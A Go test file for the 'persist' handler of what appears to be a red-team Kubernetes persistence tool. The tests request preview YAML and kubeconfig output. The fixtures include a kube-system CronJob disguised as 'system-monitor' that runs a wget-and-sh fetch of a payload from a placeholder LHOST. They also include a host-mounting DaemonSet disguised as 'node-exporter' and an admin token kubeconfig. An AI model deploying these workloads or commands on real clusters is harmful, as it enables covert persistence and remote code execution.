package handler

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	"sigs.k8s.io/yaml"
)

func TestGenerateCronJobPreviewReturnsValidYAML(t *testing.T) {
	gin.SetMode(gin.TestMode)

	handler := NewPersistHandler()
	router := gin.New()
	router.POST("/persist/cronjob", handler.GenerateCronJob)

	req := httptest.NewRequest(http.MethodPost, "/persist/cronjob", strings.NewReader(`{
		"target_host":"demo.local",
		"namespace":"kube-system",
		"name":"system-monitor",
		"image":"alpine",
		"schedule":"*/10 * * * *",
		"command":"sh -c \"wget -q http://LHOST/payload -O /tmp/p && sh /tmp/p\"",
		"apply":false
	}`))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected HTTP 200, got %d body=%s", rec.Code, rec.Body.String())
	}

	var body map[string]interface{}
	if err := yaml.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("expected JSON body to decode: %v", err)
	}
	if got, _ := body["preview"].(bool); !got {
		t.Fatalf("expected preview=true, got %#v", body["preview"])
	}
	if got, _ := body["generated"].(bool); !got {
		t.Fatalf("expected generated=true, got %#v", body["generated"])
	}
	if got, _ := body["applied"].(bool); got {
		t.Fatalf("expected applied=false in preview response, got %#v", body["applied"])
	}

	yamlText, _ := body["yaml"].(string)
	if !strings.Contains(yamlText, "apiVersion: batch/v1") || !strings.Contains(yamlText, "kind: CronJob") {
		t.Fatalf("expected CronJob yaml with apiVersion/kind, got %q", yamlText)
	}
}

func TestGenerateDaemonSetPreviewReturnsValidYAML(t *testing.T) {
	gin.SetMode(gin.TestMode)

	handler := NewPersistHandler()
	router := gin.New()
	router.POST("/persist/daemonset", handler.GenerateDaemonSet)

	req := httptest.NewRequest(http.MethodPost, "/persist/daemonset", strings.NewReader(`{
		"target_host":"demo.local",
		"namespace":"kube-system",
		"name":"node-exporter",
		"image":"alpine",
		"mount_path":"/host",
		"command":"while true; do sleep 3600; done",
		"apply":false
	}`))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected HTTP 200, got %d body=%s", rec.Code, rec.Body.String())
	}

	var body map[string]interface{}
	if err := yaml.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("expected JSON body to decode: %v", err)
	}
	if got, _ := body["preview"].(bool); !got {
		t.Fatalf("expected preview=true, got %#v", body["preview"])
	}
	yamlText, _ := body["yaml"].(string)
	if !strings.Contains(yamlText, "apiVersion: apps/v1") || !strings.Contains(yamlText, "kind: DaemonSet") {
		t.Fatalf("expected DaemonSet yaml with apiVersion/kind, got %q", yamlText)
	}
}

func TestNormalizeKubeconfigServer(t *testing.T) {
	cases := map[string]string{
		"demo.local":              "https://demo.local:6443",
		"demo.local:8443":         "https://demo.local:8443",
		"https://demo.local":      "https://demo.local:6443",
		"https://demo.local:9443": "https://demo.local:9443",
		"https://127.0.0.1:18084": "https://127.0.0.1:18084",
	}

	for input, want := range cases {
		if got := normalizeKubeconfigServer(input); got != want {
			t.Fatalf("normalizeKubeconfigServer(%q) = %q, want %q", input, got, want)
		}
	}
}

func TestGenerateKubeconfigDoesNotDoublePrefixHTTPS(t *testing.T) {
	gin.SetMode(gin.TestMode)

	handler := NewPersistHandler()
	router := gin.New()
	router.POST("/persist/kubeconfig", handler.GenerateKubeconfig)

	req := httptest.NewRequest(http.MethodPost, "/persist/kubeconfig", strings.NewReader(`{
		"server":"https://demo.local",
		"cluster":"demo",
		"token":"abc"
	}`))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected HTTP 200, got %d body=%s", rec.Code, rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), "https://https://") {
		t.Fatalf("expected kubeconfig server to avoid double https prefix, got %s", rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "server: https://demo.local:6443") {
		t.Fatalf("expected normalized kubeconfig server, got %s", rec.Body.String())
	}
}

func TestGenerateKubeconfigProducesValidUserEntry(t *testing.T) {
	gin.SetMode(gin.TestMode)

	handler := NewPersistHandler()
	router := gin.New()
	router.POST("/persist/kubeconfig", handler.GenerateKubeconfig)

	req := httptest.NewRequest(http.MethodPost, "/persist/kubeconfig", strings.NewReader(`{
		"server":"demo.local",
		"cluster":"demo",
		"token":"abc"
	}`))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected HTTP 200, got %d body=%s", rec.Code, rec.Body.String())
	}
	var body struct {
		Kubeconfig string `json:"kubeconfig"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	var cfg struct {
		Users []struct {
			Name string `yaml:"name"`
			User struct {
				Token string `yaml:"token"`
			} `yaml:"user"`
		} `yaml:"users"`
	}
	if err := yaml.Unmarshal([]byte(body.Kubeconfig), &cfg); err != nil {
		t.Fatalf("kubeconfig should parse as yaml: %v\n%s", err, body.Kubeconfig)
	}
	if len(cfg.Users) != 1 || cfg.Users[0].Name != "admin" || cfg.Users[0].User.Token != "abc" {
		t.Fatalf("expected users[0].user.token to be populated, got %#v", cfg.Users)
	}
}
